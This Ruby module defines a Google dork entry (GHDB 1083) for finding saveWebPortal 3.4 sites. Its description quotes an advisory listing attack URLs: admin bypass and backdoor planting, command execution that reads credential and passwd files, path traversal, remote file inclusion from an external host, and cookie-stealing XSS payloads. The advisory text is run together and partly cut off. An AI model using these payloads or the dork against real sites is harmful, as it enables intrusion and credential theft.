module Dorks
   class Dork1083 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1083",
            ghdb_url: "https://www.exploit-db.com/ghdb/1083",
            severity: "6",
            category: "advisories_and_vulnerabilities.rce.itworking",
            publish_date: "2005-08-21",
            author: "anonymous",
            dork: <<~EDORK,
"powered by ITWorking"
EDORK
            description: <<~EDESC
saveWebPortal 3.4 remote code execution / admin check bypass / remote fileinclusion / cross site scripting author site: http://www.circeos.itdownload page: http://www.circeos.it/frontend/index.php?page=downloadsa) remote code execution:a user can bypass admin check, calling this url:http://[target]/saveweb/admin/PhpMyExplorer/editerfichier.php?chemin=.&fichier=header.php&type=Sourcenow can leave a backdoor in header.php or some other file, example:after editing template, user can execute arbitrary system commands, through aurl like this:http://[target]/saveweb/header.php?command=ls%20-lato list directories...http://[target]/saveweb/header.php?command=cat%20config.inc.phpto see database username/password and admin panel username/password (now attacker have full access to site configuration... can go tohttp://[target]/saveweb/admin/to login...)http://[target]/saveweb/header.php?command=cat%20/etc/passwdto see passwd file...b) arbitrary file inclusion:a user can view any file on the target server,if not with .php extension:http://[target]/saveweb/menu_dx.php?SITE_Path=../../../../../boot.ini%00http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../boot.ini%00can execute arbitrary file resident on target server, if with .php extension,example :http://[target]/saveweb/menu_dx.php?SITE_Path=../../../../../[script].php%00http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../[script].php%00can craft a malicious url to cause victim user to execute commands on externalsite:http://[target]/saveweb/menu_dx.php?SITE_Path=http://[external_site]/cmd.gif%00http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=http://[external_site]/cmd.gif%00where cmd.gif is a file like this:c) xss:c.1)http://[target]/saveweb/footer.php?TABLE_Width=>alert(document.cookie)http://[target]/saveweb/footer.php?SITE_Author_Domain=>alert(document.cookie)http://[target]/saveweb/footer.php?SITE_Author=>alert(document.cookie)http://[target]/saveweb/footer.php?L_Info=>alert(document.cookie)http://[target]/saveweb/footer.php?L_Help=>alert(document.cookie)http://[target]/saveweb/header.php?TABLE_Width=>alert(document.cookie)http://[target]/saveweb/header.php?L_Visitors=>alert(document.cookie)http://[target]/saveweb/header.php?count=>alert(document.cookie)http://[target]/saveweb/header.php?SITE_Logo=">alert(document.cookie)http://[target]/saveweb/header.php?BANNER_Url=">alert(document.cookie)http://[target]/saveweb/header.php?L_Sunday="}alert(document.cookie)
EDESC
         })

      end
   end
end
